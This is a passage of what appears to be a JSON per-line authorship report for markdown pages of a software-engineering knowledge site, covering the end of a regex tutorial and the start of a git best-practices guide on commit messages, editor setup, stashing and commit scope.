          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 376,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 377,
        "author": {
          "gitId": "-"
        },
        "content": "contested"
      },
      {
        "lineNumber": 378,
        "author": {
          "gitId": "-"
        },
        "content": "  ^"
      },
      {
        "lineNumber": 379,
        "author": {
          "gitId": "-"
        },
        "content": "c.ed"
      },
      {
        "lineNumber": 380,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 381,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 382,
        "author": {
          "gitId": "-"
        },
        "content": "Since `o` is a suitable match for `.+`, the engine accepts it and tries to match the `ed`. If no match is found, the engine would bactrack and match `c..ed`, and so on. We can see a clear advantage here for matching short strings, as we can guarantee that we\u0027ll never iterate further than the length of the pattern."
      },
      {
        "lineNumber": 383,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 384,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 385,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Related Links"
      },
      {
        "lineNumber": 386,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 387,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* [The Regex Engine](https://www.regular-expressions.info/engine.html)"
      },
      {
        "lineNumber": 388,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* [Catastrophic Backtracking](https://www.regular-expressions.info/catastrophic.html)"
      },
      {
        "lineNumber": 389,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 390,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Learning Resources"
      },
      {
        "lineNumber": 391,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 392,
        "author": {
          "gitId": "-"
        },
        "content": "* [Printable cheat sheet for quick reference](https://www.cheatography.com/davechild/cheat-sheets/regular-expressions/pdf/)"
      },
      {
        "lineNumber": 393,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* [Comprehensive Regex Knowledge Base](https://www.regular-expressions.info/)"
      },
      {
        "lineNumber": 394,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 395,
        "author": {
          "gitId": "-"
        },
        "content": "### Fun Stuff"
      },
      {
        "lineNumber": 396,
        "author": {
          "gitId": "-"
        },
        "content": "* [Regex Golf - Test your Regex skills!](https://alf.nu/RegexGolf)"
      },
      {
        "lineNumber": 397,
        "author": {
          "gitId": "-"
        },
        "content": "* [Regex Crossword - Crosswords, but with Regex](https://regexcrossword.com/)"
      },
      {
        "lineNumber": 398,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 399,
        "author": {
          "gitId": "-"
        },
        "content": "### Further Reading"
      },
      {
        "lineNumber": 400,
        "author": {
          "gitId": "-"
        },
        "content": "* [Regular Expressions Cookbook](https://www.amazon.com/Regular-Expressions-Cookbook-Solutions-Programming/dp/1449319432) - *Jan Goyvaerts, Steven Levithan*"
      },
      {
        "lineNumber": 401,
        "author": {
          "gitId": "-"
        },
        "content": "* [Teach Yourself Regular Expressions in 10 Minutes](https://www.amazon.com/exec/obidos/ASIN/0672325667/jgsbookselection) - *Ben Forta*"
      },
      {
        "lineNumber": 402,
        "author": {
          "gitId": "-"
        },
        "content": "* [Mastering Regular Expressions](https://www.amazon.com/Mastering-Regular-Expressions-Jeffrey-Friedl/dp/0596528124) - *Jeffrey Friedl*"
      },
      {
        "lineNumber": 403,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 8,
      "jamessspanggg": 9,
      "iskandarzulkarnaien": 28,
      "-": 358
    }
  },
  {
    "path": "contents/revisionControl/bestPracticesGit.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Best Practices with `git`"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "# Best Practices With `git`"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author(s): [Darren Wee](https://github.com/darrenwee)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "- [Introduction](#introduction)"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": "- [Best Practices](#best-practices)"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "    - [Write Good Commit Messages](#write-good-commit-messages)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "        - [What Constitutes a Good Commit Message](#what-constitutes-a-good-commit-message)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "        - [Set Up Your Editor for Commit Messages](#set-up-your-editor-for-commit-messages)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": "    - [Always Commit Functional Code](#always-commit-functional-code)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "        - [Stashing](#stashing)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "    - [One Logical Change per Commit](#one-logical-change-per-commit)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "    - [Hide the Sausage Making](#hide-the-sausage-making)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "        - [How to Hide the Sausage Making](#how-to-hide-the-sausage-making)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "    - [Respect Published History](#respect-published-history)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "    - [Keep Up To Date](#keep-up-to-date)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "        - [Working with Remotes](#working-with-remotes)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "        - [Rebase versus Merging](#rebase-versus-merging)"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "- [Resources](#resources)"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "    - [Further Reading](#further-reading)"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "# Introduction"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "[`git`](https://git-scm.com/) is a popular source code management tool and commonly used in many open-source projects, especially those on [GitHub](https://github.com)."
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "# Best Practices"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "`git` can be an incredibly useful tool for collaboration or it can be a terrible headache. Best practices exist in order to create a common understanding between users so that the latter does not happen."
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "Best practices are guidelines that are mostly sensible, but are still guidelines. You can always choose to ignore them although best if you have a compelling reason to do so."
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "---"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "## Write Good Commit Messages"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "Good commit messages can help reviewers or other contributors to understand:"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "- the high-level changes made by your pull request/patch"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "- the reasoning behind the changes made by that commit while"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "    - reviewing your code"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "    - figuring out why a piece of code that is five years old is that way"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "They also assist you in the development process if you forget what has been done, or if you need to cherry-pick commits for elsewhere."
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "### What Constitutes a Good Commit Message"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "The easiest way to attain commit message discipline is to stop putting in one-liner descriptions using `git commit -m \"Add some things to that.\"`. Instead, write a proper commit message in an editor:"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "```bash"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "# opens your editor to write a commit message properly"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "git add files-to-stage"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "git commit"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "# like above, but shows the diff of the currently staged files"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "git add files-to-stage"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "git commit --verbose"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "# amend the most recent commit message"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "git commit --amend HEAD^"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "Every commit must have a well written commit message _subject line_."
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "1. Try to limit the subject line to 50 characters (hard limit: 72 chars)"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "    - Usually, only the subject line is shown in the log, conflict resolution, interactive rebase, etc."
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "2. Capitalize the subject line e.g. `Move index.html file to root`"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "    - Do not end the subject line with a period."
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "3. Use the imperative mood in the subject line"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "    - e.g. `Add README.md` rather than `Added README.md` or `Adding README.md` or `Adds README.md`."
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "4. Use `{scope}: {change}` format when applicable"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "    - e.g. `Person class: remove static imports`, or `Unit tests: remove blank lines`"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "5. Commit messages for non-trivial commits should have a *body* giving details of the commit."
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "    1. Separate subject from body with a blank line"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "    2. Wrap the body at 72 characters"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "    3. Use the body to explain:"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "        - _what_ the commit does, and"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "        - _why_ it was done that way, such that"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "        - the reader can refer to the diff to understand _how_ the change was done."
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "    4. Avoid including information that can be included in the code as comments."
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "Give an explanation for the change(s) that is detailed enough so that the reader can judge if it is a good thing to do, without reading the actual diff to determine how well the code does what the explanation promises to do. If your description starts to get too long, that’s a sign that you probably need to split up your commit to finer grained pieces."
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "Commit messages need to be wrapped to 72 characters or less so that the entire message can be shown without overflow on a standard, 80-column terminal while leaving room for indents/nested reply indicators if you pass `.patch` or `.diff` files via traditional mailing list ([source](https://stackoverflow.com/a/2120040/5399892))."
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "Read more: [Formats and Conventions: Commit Messages](https://oss-generic.github.io/process/docs/FormatsAndConventions.html#commit-message)"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "As a litmus test, you can try to read your commit message summary in the following manner:"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e If applied, this commit will `your commit message summary here`"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "For example:"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e If applied, this commit will `implement getHash() functionality in HashHelper`."
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "#### Examples of Good Commit Messages"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "Adapted from [se-edu/addressbook-level4](https://github.com/se-edu/addressbook-level4/commits/master) ([patch](https://github.com/se-edu/addressbook-level4/commit/2f4405c75cd21111952565a9706a9793b475c41e.patch))."
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "This commit message follows the guidelines above and also includes the context of the change (how it worked before this patch) as it is necessary to understand _why_ it needed to change."
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "UniquePersonList#remove(Person): update return type"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "UniquePersonList#remove(Person) returns true if the person passed into"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "this method can be found in the internal list, and false otherwise. It"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "also throws PersonNotFoundException if a person is not found."
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "Returning a boolean is not required as the exception is thrown before"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "the value is returned."
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "Let\u0027s update the return type for UniquePersonList#remove(Person) to"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "void."
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "Adapted from [torvalds/linux](https://github.com/torvalds/linux/commits/master) ([patch](https://github.com/torvalds/linux/commit/9fe8f03bc0227fb573cc3e5b99eb34e19e405ab6.patch))."
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "drm/amd/display: Fix memleaks when atomic check fails"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "While checking plane states for updates during atomic check, we create"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "dc_plane_states in preparation. These dc states should be freed if"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "something errors."
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "Although the input transfer function is also freed by"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "dc_plane_state_release(), we should free it (on error) under the same"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "scope as where it is created."
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "More examples can be found here: [Formats and Conventions: Commit Messages](https://oss-generic.github.io/process/docs/FormatsAndConventions.html#commit-message)"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Set up Your Editor for Commit Messages"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "1. To use your editor of choice for `git`-related functionality, e.g. `vim`, do one of either in your terminal:"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "```bash"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "git config --global core.editor \"vim\" # or you can do the following"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "export GIT_EDITOR\u003dvim # add to your .bashrc or equivalent"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "2. Set your editor to wrap after 72 characters. In `vim`, you can do this by adding this to your `.vimrc`:"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "```bash"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "autocmd Filetype gitcommit spell textwidth\u003d72"
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "---"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "## Always Commit Functional Code"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "Merges to the following must always leave the project in a working state, i.e. it can be built and run on:"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "- `master` branch, or equivalent,"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "- `staging` branch, `development` branch or equivalent, if any."
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "Changes to your own branches _that no one else is using_ can have non-functioning commits. However, you may wish to [hide the sausage making](#hide-the-sausage-making) to squash non-functioning commits into a single, functioning commit before you make a pull request."
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "Changes to your own branches that is used by others should obey always-functioning-commits rule to minimize surprise. This is especially important if you expect your branch to be cherry-picked by another collaborator because they require a specific bit of code that you wrote."
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "### Stashing"
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "If you need to switch between branches while in the middle of developing a commit, you can use the `git stash` command. Stashing saves the uncommitted changes made in your current working directly. This allows you to save your progress without having to commit non-functioning code."
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "```bash"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "# stash your work not committed to HEAD yet by pushing it onto the stash stack"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "git stash"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "git stash push # equivalent to git stash"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "# restore your most recently stashed work to your current working copy"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "git stash pop"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "# acts like git stash pop, but keeps a copy of the stash in the current stash stack"
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "git stash apply"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "# list all stashes in the stack"
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": "git stash list"
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "Stashes are a purely local construct and cannot be pushed to a remote repository."
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "Read more:"
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": "- [git stash - Saving Changes | Atlassian Git Tutorial](https://www.atlassian.com/git/tutorials/git-stash)"
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": "---"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "## One Logical Change per Commit"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": "Commits are the building blocks of a codebase; each building block should contribute exactly one useful thing, like:"
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": "- adding a new function or piece of data"
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "- fixing a bug"
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "- refactoring code or data"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "    - reorganizing code"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "    - removing typos"
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "    - formatting code"
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": "    - changing representation of data to a different format"
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": "Each _logical change in code_ should translate to exactly one commit, nothing more or less. Doing so allows you to:"
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": "- revert a particular logical change with little to no side effects"
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": "- easily identify bad commits that caused change in behavior"
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": "- collaborate with others easily, e.g. by cherry-picking a single logical change instead of finding a bit of this commit and a bit of that commit"
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": "- package that logical change [with a useful commit message to explain why/how you did something](#write-good-commit-messages)"
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": "It may also become necessary to scope down what you may deem as a single logical change if it results in a very large commit, as that can also [introduce other problems](https://softwareengineering.stackexchange.com/a/10796). For example, implementing a single, new feature can be thought of as one logical change to the codebase, but making a pull request for a single, large commit also makes the above benefits disappear."
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "-"
        },
        "content": "If you are concerned about appearances, you can always opt to [hide the sausage making](#hide-the-sausage-making) to clean up your commit history."
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": "If you have made several overlapping changes on your working directory (e.g. forgot to commit, etc), you can always [perform a patch-wise stage using `git add -p`](https://stackoverflow.com/questions/1085162/commit-only-part-of-a-file-in-git)."
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": "Read more:"
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "-"
        },
        "content": "- [Do commit early and often](https://sethrobertson.github.io/GitBestPractices/#commit) - an auxiliary best practice of frequency of making commits"
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": "- [programming practices - When to commit code?](https://softwareengineering.stackexchange.com/questions/83837/when-to-commit-code)"
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": "- [When is a version control commit too large?](https://softwareengineering.stackexchange.com/questions/10793/when-is-a-version-control-commit-too-large) - a discussion on judging the suitable size of a commit in different settings"
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": "- [Commit only part of a file in Git](https://stackoverflow.com/questions/1085162/commit-only-part-of-a-file-in-git) - this is useful to use as a cheatsheet during interactive staging"
      },
      {
